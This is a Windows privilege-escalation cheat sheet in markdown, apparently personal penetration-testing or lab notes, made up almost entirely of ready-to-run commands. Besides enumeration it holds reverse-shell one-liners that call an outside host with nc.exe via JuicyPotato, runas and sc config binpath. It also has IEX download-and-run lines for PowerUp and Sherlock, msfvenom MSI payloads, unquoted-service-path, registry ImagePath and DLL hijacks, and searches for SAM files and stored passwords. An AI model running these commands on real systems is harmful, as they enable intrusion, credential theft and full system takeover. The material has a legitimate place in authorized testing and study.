# Big Checklist

## System Enum

```powershell
systeminfo
Systeminfo | findstr /B /C:"OS Name" /C:"System Type"
```

## Updates

```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
Wmic logicaldisk get caption,description
```

## Applications

```powershell
wmic product get name, version, vendor
accesschk.exe -uws "Everyone" "C:\\Program Files"
Get-ChildItem "C:\\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\\sAllow\\s\\sModify"}
```

## Services

```powershell
sc query state=all | findstr "SERVICE_NAME:"
wmic service get name,displayname,pathname,startmode
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

## Disk Volume

```powershell
mountvol
```

## Drivers - in powershell

```powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

## User enum

```powershell
whoami
echo %USERNAME%
whoami /priv
whoami /groups
whoami /all

If user has SeImpersonate privs, try JuicyPotato/PrintSpoofer:
juicy.exe -l 4444 -p c:\\windows\\system32\\cmd.exe -a "/c  \\\\192.168.119.155\\test\\nc.exe -e cmd.exe 192.168.119.155 4447" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}

net user
net localgroup
net user /domain
net group /domain
net group /domain <Group Name>
```

## Network / Firewall / AV / Defender

```powershell
ipconfig /all
route print
arp -A
netsh firewall show state
netsh firewall show config
Sc query windefend
Netsh advfirewall firewall dump, netsh firewall show state

```

## Checklist automated tools

```powershell
- Run Winpeas
- Run PowerUp.ps1
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('<http://192.168.119.155/PowerUp.ps1>');Invoke-AllChecks"
- Run Sherlock.ps1
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('<http://192.168.119.155/Sherlock.ps1>');Find-AllVulns"
```

## Check folder permissions

```powershell
accesschk.exe /accepteula -wvu
Folder Perms
\\\\192.168.119.155\\test\\accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\\
\\\\192.168.119.155\\test\\accesschk.exe /accepteula -uwdqs "Everyone" C:\\
File Perms
\\\\192.168.119.155\\test\\accesschk.exe /accepteula -uwqs  "Authenticated Users" C:\\*.*
\\\\192.168.119.155\\test\\accesschk.exe /accepteula -uwdqs "Everyone" C:\\*.*
```

## Running processes to started services

```powershell
tasklist /SVC
```

## Windows services that are started

```powershell
net start
```

## Look for 3rd party drivers

```powershell
DRIVERQUERY
```

## Check if WMIC is allowed on low priv shell. Mostly allowed on Win7 /win8

```powershell
wmic /?
Automated WMIC info - <https://www.fuzzysecurity.com/tutorials/files/wmic_info.rar>
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
```

## Check directory permissions

```powershell
cacls "C:\\Python27"
```

## Scheduled Tasks

```powershell
schtasks /query /fo LIST /v  # Copy to schtasks.txt on local and run
kali@kali$ cat schtask.txt | grep "SYSTEM\\|Task To Run" | grep -B 1 SYSTEM
dir %SystemRoot%\\Tasks
e.g. c:\\windows\\tasks\\
e.g. c:\\windows\\system32\\tasks\\

# If we have write permissions on the scheduled tasks binary / binary dir
accesschk.exe -dqv "E:\\GrabLogs"
copy evil-tftp.exe E:\\GrabLogs\\tftp.exe
```

## Startups and autoruns

```powershell
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
wmic startup get caption,command
reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\R
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
dir "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup"
dir "C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup"

# Check access on the files and dir using accesschk , if writebale , we can write malicious binary.
accesschk64.exe /accepteula -wvu "C:\\Program Files\\Autorun Program"
```

## Service Permissions

### Check if service config can be modified

```powershell
accesschk.exe /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv \\<Service Name>
sc qc \\<Service Name>  #  Get service details
```

### Unquoted Service Path

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\\windows\\\\" |findstr /i /v """
sc query
sc qc service name
```

## AlwaysInstallElevated

IF 64 bits use: %SystemRoot%\Sysnative\reg.exe

```powershell
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\
# Check for AlwaysInstallElevated = 1 , if yes create a msfvenom msi payload
msfvenom -p windows/shell_reverse_tcp lhost= lport= -f msi -o setup.msi
msiexec /quiet /qn /i C:\\Temp\\setup.msi
```

## Service only available from inside

```powershell
netstat -ano
upload plink.exe
plink.exe -R "remote port":127.0.0.1:"local port"  root@"ipaddress"
```

## Password in files

```powershell
# Check for savecred
# <https://pentestlab.blog/tag/privilege-escalation/page/3/>
cmdkey /list        << If there are entries, it means that we may able to runas certain user who stored his cred in windows
runas /savecred /user:ACCESS\\Administrator "c:\\windows\\system32\\cmd.exe /c \\\\IP\\share\\nc.exe -nv 10.10.14.2 80 -e cmd.exe"
Can we find any SAM files?
%SYSTEMROOT%\\repair\\SAM
%SYSTEMROOT%\\System32\\config\\RegBack\\SAM
%SYSTEMROOT%\\System32\\config\\SAM
%SYSTEMROOT%\\repair\\system
%SYSTEMROOT%\\System32\\config\\SYSTEM
%SYSTEMROOT%\\System32\\config\\RegBack\\system
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
Findstr /si password *.config
findstr /si pass/pwd *.ini
dir /s *pass* == *cred* == *vnc* == *.config*
in all files
findstr /spin "password" *.*
findstr /spin "password" *.*
```

## Unattended config

```powershell
c:\\sysprep.inf
c:\\sysprep\\sysprep.xml
c:\\unattend.xml
%WINDIR%\\Panther\\Unattend\\Unattended.xml
%WINDIR%\\Panther\\Unattended.xml
dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
dir c:\\*vnc.ini /s /b
dir c:\\*ultravnc.ini /s /b
dir c:\\ /s /b | findstr /si *vnc.ini
```

## Registry

### VNC

```powershell
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
reg query "HKCU\\Software\\TightVNC\\Server"
```

### Windows autologin

```powershell
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

### SNMP Paramters

```powershell
reg query "HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP"
```

### Putty

```powershell
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
```

## Search for password in registry

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s
```

## REGSVC ACL

```powershell
# Check for registry services
> Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl

# Look for access group permissions for NT AUTH/Interactive
Create a new window service binary, check attack directory for source (net user add works)
> x86_64-w64-mingw32-gcc windows_service.c -o x.exe

# Add to the registry path
> reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\x.exe /f

# Execute using
> sc start regsvc
```

## Unquoted Service Path Exploitation

### Case 1, `SeShutdownPrivilege` is listed when checked whoami /priv

```powershell
# Search for services that auto start:
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
# Search for non-standard services
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\\windows"
# Potential unquoted service output example
Heisenburg Service   heisenburgsvc     "C:\\Program Files\\Heisenburg\\The One Who\\knocks.exe"        auto

# next check if W or F permission exists for BUILTIN\\Users or Everyone on one of the sub directory
icacls "C:\\\\"                        # or: .\\accesschk.exe /accepteula -uwdq C:\\
icacls "C:\\Program Files"             # or: .\\accesschk.exe /accepteula -uwdq "C:\\Program Files"
icacls "C:\\Program Files\\Heisenburg"  # or  .\\accesschk.exe /accepteula -uwdq "C:\\Program Files\\Heisenburg"

# Example output if (builtin\\users or EVERYONE) has ( (I) or (F) ) on "C:\\Program Files\\Heisenburg":
#                  BUILTIN\\Users:(F)
#                  BUILTIN\\Users:(I)(RX)
# Example output for accesschk.exe:
#  RW BUILTIN\\Users

# Create reverse shell binary and copy it accordingly
copy %temp%\\backdoor.exe "C:\\Program Files\\Heisenburg\\The.exe"

# now reboot to have the service auto start
shutdown /r /t 0
```

### Case 2, `SeShutdownPrivilege` = Disabled, we have (service_stop,service_start) privilege on a service

```powershell
# Search for services that has manual start mode and non-standard
wmic service get name,displayname,pathname,startmode | findstr /i "manual" | findstr /i /v "c:\\windows"
# Potential unquoted service output example
Heisenburg Service   heisenburgsvc     "C:\\Program Files\\Heisenburg\\The One Who\\knocks.exe"        manual

# Check if we have service_stop, service_start privilege
.\\accesschk.exe /accepteula -ucqv user heisenburgsvc

# next check if W or F permission exists for BUILTIN\\Users or Everyone on one of the sub directory
icacls "C:\\\\"                         # or: .\\accesschk.exe /accepteula -uwdq C:\\
icacls "C:\\Program Files"             # or: .\\accesschk.exe /accepteula -uwdq "C:\\Program Files"
icacls "C:\\Program Files\\Heisenburg"  # or  .\\accesschk.exe /accepteula -uwdq "C:\\Program Files\\Heisenburg"
# Example output if (builtin\\users or EVERYONE) has ( (I) or (F) ) on "C:\\Program Files\\Heisenburg":
#                  BUILTIN\\Users:(F)
#                  BUILTIN\\Users:(I)(RX)

# Example output for accesschk.exe:
  RW BUILTIN\\Users

Since there is spaces between "\\The One Who\\" on the path
Windows will look for "\\The.exe" first, then "\\The One.exe", then "\\The One Who.exe", and finally "\\The One Who\\knocks.exe"

# Create reverse shell binary and copy it accordingly
copy %temp%\\backdoor.exe "C:\\Program Files\\Heisenburg\\The.exe"

# Start netcat listener to catch the reverse shell and start the service
net start heisenburgsvc # net stop heisenburgsvc first if the service is already running.
```

## Weak service permissions Exploitation

```powershell
# download accesschk.exe form here <https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe>
# List access for all services
.\\accesschk.exe /accepteula -uwcqv "Authenticated Users" * # or: .\\accesschk.exe /accepteula -uwcqv user *

# Example Output, have full access in two services:
$ RW SSDPSRV
$	SERVICE_ALL_ACCESS
$ RW upnphost
$	SERVICE_ALL_ACCESS
# at least (service_change_config, service_start, service_stop) access is needed, service_all_access = full access
# If both conditions are met we can start exploiting this now.

# List current config for the service
sc qc upnphost

# see if START TYPE is DEMAND_START and if SERVICE_START_NAME is higher privileged
 $        START_TYPE         : 3   DEMAND_START
 ...
 ...
 $        SERVICE_START_NAME : NT AUTHORITY\\LocalService

# change binpath with the payload you want to execute, example rev shell with uploaded nc.exe:
sc config "upnphost" binpath= "C:\\WINDOWS\\Temp\\nc.exe 192.168.119.147 443 -e C:\\WINDOWS\\System32\\cmd.exe"

# remove dependencies (if any)
sc config "upnphost" depend= ""

# make it run from system account
sc config "upnphost" obj= ".\\LocalSystem" password= ""

# Start netcat listener to catch the reverse shell and start the service
net start "upnphost" # net stop "upnphost" first if the service is already running.
```

## Weak Registry Permissions Exploitation

```powershell
# Check permissions for an example service "upnphost"
Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\upnphost | Format-List # PowerShell

# Example output, Check if NT AUTHORITY\\INTERACTIVE has Full Control
Access : Everyone Allow  ReadKey
        NT AUTHORITY\\INTERACTIVE Allow  FullControl
        NT AUTHORITY\\SYSTEM Allow  FullControl

.\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\upnphost # same thing accesschk
# Example output for accesschk.exe:
 RW NT AUTHORITY\\INTERACTIVE
       KEY_ALL_ACCESS

# Check if we have service_stop, service_start privilege
.\\accesschk.exe /accepteula -ucqv user upnphost
# If both conditions are met we can start exploiting this now.
# list current values of the service
reg query HKLM\\System\\CurrentControlSet\\Services\\upnphost

# example output:
HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\upnphost
   DisplayName    REG_SZ    @%systemroot%\\system32\\upnphost.dll,-213
   ErrorControl    REG_DWORD    0x1
   ImagePath    REG_EXPAND_SZ    %SystemRoot%\\system32\\svchost.exe -k LocalServiceAndNoImpersonation
   ...

# update ImagePath to point to our reverse shell payload
reg add HKLM\\System\\CurrentControlSet\\Services\\upnphost /v ImagePath /t REG_EXPAND_SZ /d C:\\Windows\\Temp\\backdoor.exe /f

# Start netcat listener to catch the reverse shell and start the service
net start "upnphost" # net stop "upnphost" first if the service is already running.
```

## Weak Service Executable File Permissions Exploitation

```powershell
# verifying we can overwrite and existing service binary file
icacls "C:\\Program Files\\Heisenburg\\knocks.exe"  # or .\\accesschk.exe /accepteula -uvwq "C:\\Program Files\\Heisenburg\\knocks.exe"
# Example output if (builtin\\users or EVERYONE) has ( (I) or (F) ) on "C:\\Program Files\\Heisenburg":
                  Everyone:(F)
                  BUILTIN\\Users:(I)(RX)

# Example output for accesschk.exe:
  RW BUILTIN\\Users
        FILE_ALL_ACCESS

# backup original executable
copy "C:\\Program Files\\Heisenburg\\knocks.exe"  C:\\Temp\\

# Create reverse shell binary and overwrite the existing one
copy /Y C:\\Temp\\backdoor.exe "C:\\Program Files\\Heisenburg\\knocks.exe"

# Start netcat listener to catch the reverse shell and start the service
net start "heisenburgsvc" # net stop "heisenburgsvc" first if the service is already running.
```

## AlwaysInstallElevated privilege Escalation

```powershell
# This will only work if both registry keys contain "AlwaysInstallElevated" value 0x1.
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# if the conditions are met we can exploit this now

# generate reverse shell msi payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MY-IP> LPORT=<MY-PORT> -f msi -o shell.msi

# copy the binary over to target, start a listener and exec
msiexec /quiet /qn /i C:\\Temp\\shell.msi
```

## DLL hijacking

```powershell
You can see the DLL search order on 32-bit systems below:
1 - The directory from which the application loaded
2 - 32-bit System directory (C:\\Windows\\System32)
3 - 16-bit System directory (C:\\Windows\\System)
4 - Windows directory (C:\\Windows)
5 - The current working directory (CWD)
6 - Directories in the PATH environment variable (system then user)

As a low privilege user we have little hope of putting a malicious DLL in 1-4, 5 is not a possibility in this case because we are talking about a Windows service but if we have write access to any of the directories in the Windows PATH we win.
echo %path%

# We can check our access permissions with accesschk or cacls
accesschk.exe -dqv "C:\\Python27"
cacls "C:\\Python27"

# Before we go over to action we need to check the status of the IKEEXT service. In this case we can see it is set to "AUTO_START" so it will launch on boot!
sc qc IKEEXT
copy evil.dll C:\\Python27\\wlbsctrl.dll
Restart
```

## Stored credentials

```powershell
cmdkey /list

# if saved creds exist use runas to execute as that user
runas /savedcred /user:<USERNAME-OF-SAVED-CRED> C:\\Temp\\backdoor.exe

Get passwords from windows registry
# autologon creds
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon' | select "Default*"
or,
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"

# VNC
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"

# SNMP Paramters
reg query "HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP"

# Putty
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"

Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Files that may contain passwords

```powershell
c:\\sysprep.inf
c:\\sysprep\\sysprep.xml
%WINDIR%\\Panther\\Unattend\\Unattended.xml
%WINDIR%\\Panther\\Unattended.xml
# sysbol policy files containing cPassword on a domain controller;
# general locations: %SYSTEMROOT%\\SYSVOL\\sysvol
# \\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\
Services\\Services.xml: Element-Specific Attributes
ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\\Printers.xml: SharedPrinter Element
Drives\\Drives.xml: Element-Specific Attributes
DataSources\\DataSources.xml: Element-Specific Attributes
```

## Find all weak folder permissions per drive

```powershell
accesschk.exe -uwdqs Users c:\\
accesschk.exe -uwdqs "Authenticated Users" c:\\
```

## Find all weak file permissions per drive

```powershell
accesschk.exe -uwqs Users c:\\*.*
accesschk.exe -uwqs "Authenticated Users" c:\\*.*
```